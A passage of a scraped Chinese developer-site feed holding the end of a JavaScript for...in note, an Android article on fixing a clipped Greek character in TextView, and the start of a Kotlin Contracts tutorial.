<h4 data-id="heading-12">使用注意事项：</h4>
<ol>
<li><strong>遍历顺序</strong>：
<ul>
<li>整数属性按升序排列（如 <code>"0"</code>, <code>"1"</code>, <code>"10"</code>）</li>
<li>其他属性按创建顺序排列</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> codes = {
  <span class="hljs-string">"49"</span>: <span class="hljs-string">"Germany"</span>,
  <span class="hljs-string">"41"</span>: <span class="hljs-string">"Switzerland"</span>,
  <span class="hljs-string">"44"</span>: <span class="hljs-string">"Great Britain"</span>,
  <span class="hljs-comment">// ..,</span>
  <span class="hljs-string">"1"</span>: <span class="hljs-string">"USA"</span>
};

<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> code <span class="hljs-keyword">in</span> codes) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(code); <span class="hljs-comment">// 1, 41, 44, 49</span>
}

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94f5954c905e447f9dc6d4fc32a3efb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309604&amp;x-signature=NopfoIrlLIHAOW0VVyiBnK84KRc%3D" alt="image.png" loading="lazy"/><br/>
2. <strong>避免用于数组</strong>：</p>
<ul>
<li>数组的索引是整数属性，所以 <code>for...in</code> 会按数值排序，但可能误处理 <code>length</code> 或其他非索引属性。</li>
</ul>
<p>推荐使用 <code>for...of</code> 或 <code>Array.forEach()</code> 遍历数组。</p>
<hr/>
<blockquote>
<p>最后：<br/>
JavaScript 的对象看似简单，却蕴含着许多细节。掌握这些知识点不仅能写出更优雅的代码，还能避免潜在的 bug。希望这篇笔记对你有所帮助！</p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[希腊字母"Έ"显示不全的奇妙冒险]]></title>    <link>https://juejin.cn/post/7574739133946511402</link>    <guid>https://juejin.cn/post/7574739133946511402</guid>    <pubDate>2025-11-21T05:15:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574739133946511402" data-draft-id="7574821757664772137" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="希腊字母&quot;Έ&quot;显示不全的奇妙冒险"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-11-21T05:15:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Android童话镇"/> <meta itemprop="url" content="https://juejin.cn/user/2716247406161241"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            希腊字母"Έ"显示不全的奇妙冒险
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2716247406161241/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Android童话镇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:15:07.000Z" title="Fri Nov 21 2025 05:15:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">故事开始：一个神秘的希腊字符</h2>
<p>在一个Android应用王国里，有一个名叫TextView的小镇，这里住着各种文字居民。有一天，一位来自希腊的贵族字符"Έ"来到了这个小镇。</p>
<p>"Έ"是一个特殊的字符，它有着优雅的曲线和独特的造型。但奇怪的是，每当它在TextView小镇中亮相时，左边的部分总是被神秘地切掉了！</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 问题代码示例</span>
&lt;TextView
    android:layout_width=<span class="hljs-string">"match_parent"</span>
    android:layout_height=<span class="hljs-string">"wrap_content"</span>
    android:text=<span class="hljs-string">"Έλληνικά"</span> /&gt;
</code></pre>
<h2 data-id="heading-1">发现问题：字符的"隐形斗篷"</h2>
<p>为什么"Έ"的左边会被切掉呢？让我们深入了解TextView小镇的运作机制：</p>
<h3 data-id="heading-2">TextView的测量过程</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 简化的测量流程</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TextView</span> {
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMeasure</span><span class="hljs-params">(<span class="hljs-type">int</span> widthMeasureSpec, <span class="hljs-type">int</span> heightMeasureSpec)</span> {
        <span class="hljs-comment">// 1. 测量文本需要的实际大小</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">desiredWidth</span> <span class="hljs-operator">=</span> measureText(getText());
        <span class="hljs-type">int</span> <span class="hljs-variable">desiredHeight</span> <span class="hljs-operator">=</span> measureTextHeight(getText());
        
        <span class="hljs-comment">// 2. 根据layout_width决定最终宽度</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">widthMode</span> <span class="hljs-operator">=</span> MeasureSpec.getMode(widthMeasureSpec);
        <span class="hljs-type">int</span> <span class="hljs-variable">widthSize</span> <span class="hljs-operator">=</span> MeasureSpec.getSize(widthMeasureSpec);
        
        <span class="hljs-keyword">switch</span> (widthMode) {
            <span class="hljs-keyword">case</span> MeasureSpec.EXACTLY:  <span class="hljs-comment">// 固定尺寸</span>
                mWidth = widthSize;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> MeasureSpec.AT_MOST:  <span class="hljs-comment">// 最大不超过</span>
                mWidth = Math.min(desiredWidth, widthSize);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> MeasureSpec.UNSPECIFIED:  <span class="hljs-comment">// 想要多大就给多大</span>
                mWidth = desiredWidth;
                <span class="hljs-keyword">break</span>;
        }
    }
}
</code></pre>
<p>当使用<code>match_parent</code>时，TextView的宽度被限制在父容器的范围内。如果希腊字符"Έ"需要的宽度超过了可用空间，它的左边部分就会被无情地裁剪！</p>
<h2 data-id="heading-3">解决方案：两个超级英雄登场</h2>
<h3 data-id="heading-4">英雄1：wrap_content - "自适应斗篷"</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// wrap_content的魔法</span>
&lt;TextView
    android:layout_width=<span class="hljs-string">"wrap_content"</span>  <span class="hljs-comment">// 关键改变！</span>
    android:layout_height=<span class="hljs-string">"wrap_content"</span>
    android:text=<span class="hljs-string">"Έλληνικά"</span> /&gt;
</code></pre>
<p><code>wrap_content</code>就像一个智能的伸缩斗篷，它会说："让我看看'Έ'字符到底需要多大的空间，我就给它多大的空间！"</p>
<h3 data-id="heading-5">英雄2：gravity=end - "右对齐导航员"</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 完整的解决方案</span>
&lt;TextView
    android:layout_width=<span class="hljs-string">"wrap_content"</span>
    android:layout_height=<span class="hljs-string">"wrap_content"</span>
    android:gravity=<span class="hljs-string">"end"</span>  <span class="hljs-comment">// 另一个关键改变！</span>
    android:text=<span class="hljs-string">"Έλληνικά"</span> /&gt;
</code></pre>
<p><code>gravity=end</code>则像一个聪明的导航员，它确保文本在TextView内部从右侧开始排列，这样"Έ"字符就有足够的左边空间来完整展示自己！</p>
<h2 data-id="heading-6">深入原理：字符绘制的秘密</h2>
<h3 data-id="heading-7">字符测量的挑战</h3>
<p>希腊字符"Έ"（Unicode: \u0388）是一个特殊的组合字符，它在字体中的边界(bounds)可能超出了基线(baseline)的左侧：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 字符边界测量示例</span>
<span class="hljs-type">Paint</span> <span class="hljs-variable">paint</span> <span class="hljs-operator">=</span> textView.getPaint();
<span class="hljs-type">Rect</span> <span class="hljs-variable">bounds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rect</span>();
paint.getTextBounds(<span class="hljs-string">"Έ"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, bounds);

<span class="hljs-comment">// 结果可能是：</span>
<span class="hljs-comment">// bounds.left = -5 (超出左侧边界！)</span>
<span class="hljs-comment">// bounds.right = 8</span>
<span class="hljs-comment">// 总宽度 = 13</span>
</code></pre>
<h3 data-id="heading-8">wrap_content + gravity=end的工作原理</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TextView</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">layoutText</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. wrap_content确保有足够空间</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">availableWidth</span> <span class="hljs-operator">=</span> getWidth() - getPaddingLeft() - getPaddingRight();
        <span class="hljs-type">int</span> <span class="hljs-variable">textWidth</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) getPaint().measureText(getText());
        
        <span class="hljs-comment">// 2. gravity=end控制绘制位置</span>
        <span class="hljs-type">int</span> drawX;
        <span class="hljs-keyword">switch</span> (getGravity() &amp; Gravity.HORIZONTAL_GRAVITY_MASK) {
            <span class="hljs-keyword">case</span> Gravity.END:
                <span class="hljs-comment">// 从右侧开始绘制，确保左边有足够空间</span>
                drawX = getPaddingLeft() + availableWidth - textWidth;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> Gravity.START:
                drawX = getPaddingLeft();
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> Gravity.CENTER:
                drawX = getPaddingLeft() + (availableWidth - textWidth) / <span class="hljs-number">2</span>;
                <span class="hljs-keyword">break</span>;
        }
        
        <span class="hljs-comment">// 3. 在计算的位置绘制文本</span>
        canvas.drawText(getText(), drawX, baseline, getPaint());
    }
}
</code></pre>
<h2 data-id="heading-9">时序图：完整的调用过程</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51f91de1df3c494e821c2f1e47c16339~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOerpeivnemVhw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306907&amp;x-signature=hyB8%2BdsBLyHc%2FDz6hIuGBhLX%2Bs8%3D" alt="希腊字母显示不全解决.png" loading="lazy"/></p>
<h2 data-id="heading-10">实际代码演示</h2>
<p>让我们创建一个完整的示例来验证这个解决方案：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreekTextActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        
        <span class="hljs-comment">// 创建布局</span>
        <span class="hljs-type">LinearLayout</span> <span class="hljs-variable">layout</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayout</span>(<span class="hljs-built_in">this</span>);
        layout.setOrientation(LinearLayout.VERTICAL);
        
        <span class="hljs-comment">// 问题示例：左边被裁剪</span>
        <span class="hljs-type">TextView</span> <span class="hljs-variable">problemText</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextView</span>(<span class="hljs-built_in">this</span>);
        problemText.setLayoutParams(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayout</span>.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT));
        problemText.setText(<span class="hljs-string">"问题: Έλληνικά"</span>);
        problemText.setBackgroundColor(<span class="hljs-number">0xFFFFCCCC</span>);
        
        <span class="hljs-comment">// 解决方案：wrap_content + gravity=end</span>
        <span class="hljs-type">TextView</span> <span class="hljs-variable">solutionText</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextView</span>(<span class="hljs-built_in">this</span>);
        LinearLayout.<span class="hljs-type">LayoutParams</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayout</span>.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        params.gravity = Gravity.END; <span class="hljs-comment">// 布局级别的gravity</span>
        solutionText.setLayoutParams(params);
        solutionText.setText(<span class="hljs-string">"解决方案: Έλληνικά"</span>);
        solutionText.setGravity(Gravity.END); <span class="hljs-comment">// 文本级别的gravity</span>
        solutionText.setBackgroundColor(<span class="hljs-number">0xFFCCFFCC</span>);
        
        layout.addView(problemText);
        layout.addView(solutionText);
        setContentView(layout);
    }
}
</code></pre>
<h2 data-id="heading-11">调试技巧：验证解决方案</h2>
<p>如果你想要亲眼看到这个效果，可以添加调试代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 调试字符边界</span>
<span class="hljs-type">TextView</span> <span class="hljs-variable">textView</span> <span class="hljs-operator">=</span> findViewById(R.id.my_text_view);
<span class="hljs-type">Paint</span> <span class="hljs-variable">paint</span> <span class="hljs-operator">=</span> textView.getPaint();

<span class="hljs-comment">// 测量单个字符</span>
<span class="hljs-type">Rect</span> <span class="hljs-variable">bounds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rect</span>();
paint.getTextBounds(<span class="hljs-string">"Έ"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, bounds);
Log.d(<span class="hljs-string">"TextViewDebug"</span>, <span class="hljs-string">"字符'Έ'边界: left="</span> + bounds.left + 
    <span class="hljs-string">", right="</span> + bounds.right + <span class="hljs-string">", width="</span> + bounds.width());

<span class="hljs-comment">// 测量整个文本</span>
<span class="hljs-type">float</span> <span class="hljs-variable">textWidth</span> <span class="hljs-operator">=</span> paint.measureText(<span class="hljs-string">"Έλληνικά"</span>);
Log.d(<span class="hljs-string">"TextViewDebug"</span>, <span class="hljs-string">"整个文本宽度: "</span> + textWidth);

<span class="hljs-comment">// 检查TextView的实际宽度</span>
textView.post(() -&gt; {
    Log.d(<span class="hljs-string">"TextViewDebug"</span>, <span class="hljs-string">"TextView宽度: "</span> + textView.getWidth());
    Log.d(<span class="hljs-string">"TextViewDebug"</span>, <span class="hljs-string">"可用绘制宽度: "</span> + 
        (textView.getWidth() - textView.getPaddingLeft() - textView.getPaddingRight()));
});
</code></pre>
<h2 data-id="heading-12">总结</h2>
<p>通过这个有趣的故事，我们学到了：</p>
<ol>
<li><strong>问题根源</strong>：希腊字符"Έ"可能有左边的溢出区域，在固定宽度的TextView中会被裁剪</li>
<li><strong>wrap_content的作用</strong>：让TextView根据内容自动调整宽度，确保字符有足够的展示空间</li>
<li><strong>gravity=end的妙用</strong>：让文本从右侧开始排列，为左边的溢出区域预留空间</li>
<li><strong>组合使用</strong>：这两个属性配合使用，就像给特殊字符穿上了一件合身的"定制礼服"</li>
</ol>
<p>现在，TextView小镇里的"Έ"字符终于可以完整地展示它的优雅身姿了！这就是Android布局系统中小小属性解决大问题的美妙之处。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin 可以预判你的预判？Kotlin 高级特性 之 Contracts]]></title>    <link>https://juejin.cn/post/7574775334680952842</link>    <guid>https://juejin.cn/post/7574775334680952842</guid>    <pubDate>2025-11-21T05:29:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574775334680952842" data-draft-id="7574724406305996850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin 可以预判你的预判？Kotlin 高级特性 之 Contracts"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2025-11-21T05:29:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Entropless"/> <meta itemprop="url" content="https://juejin.cn/user/3518885279826078"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin 可以预判你的预判？Kotlin 高级特性 之 Contracts
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3518885279826078/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Entropless
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:29:25.000Z" title="Fri Nov 21 2025 05:29:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言：</h2>
<p>你是否曾将 <code>if (obj != null)</code>提取成一个独立函数后，Kotlin 的智能转换（Smart Cast）就神奇地“失效”了？这不是编译器的bug，而是它的能力边界。Kotlin Contracts 正是打破这道边界的神奇钥匙。本文将基于 Kotlin 最新版本 v2.2.21 全面讲解 Kotlin Contracts 的所有特性及其使用方式。</p>
<blockquote>
<p>本文基于Android Studio Otter | 2025.2.1  &amp;   Kotlin v2.2.21</p>
</blockquote>
<h2 data-id="heading-1">What?</h2>
<p>Contracts(契约) 是一种<strong>编译时机制</strong>，是一种让编译器更了解函数行为的特性，它允许函数作者明确地告诉编译器一些关于函数行为的约束，从而帮助编译器进行更准确的类型推断和智能转换。</p>
<blockquote>
<p>嗯…… 不懂， 说人话！</p>
</blockquote>
<p>首先我们先从它的效果来直观了解一下吧</p>
<p>先看两个示例：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">(s: <span class="hljs-type">String</span>?)</span></span> {
    <span class="hljs-comment">// 编译器自动将's'转换为了'String' 而不是'String?'</span>
    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>) s.length 
}

